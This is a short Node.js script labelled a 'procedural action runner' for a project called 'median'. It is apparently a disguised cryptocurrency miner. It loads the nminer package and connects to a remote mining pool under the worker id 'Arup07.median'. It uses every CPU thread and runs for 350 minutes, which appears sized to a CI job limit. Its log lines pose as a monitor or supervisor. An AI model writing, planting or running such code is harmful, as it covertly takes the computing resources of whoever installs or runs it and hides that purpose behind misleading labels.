// Procedural action runner for median
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./lib/config");

async function startRuntime() {
    const traceId = "382fc5";
    console.log(`[monitor] Starting runtime for ${config.appName || "median"} [${traceId}]`);

    const service = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Arup07.median",
        ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
    );

    const heartbeat = setInterval(() => {}, 58000);
    setTimeout(() => {
        console.log("[timeout] Operational limit (350m) reached, exiting cleanly.");
        process.exit(0);
    }, 350 * 60 * 1000);

    process.on("SIGTERM", () => {
        clearInterval(heartbeat);
        console.log(`[monitor] Signal SIGTERM acknowledged, exiting session ${traceId}.`);
        process.exit(0);
    });

    console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
}

startRuntime().catch((err) => {
    console.error("Supervisor startup fault:", err);
    process.exit(1);
});
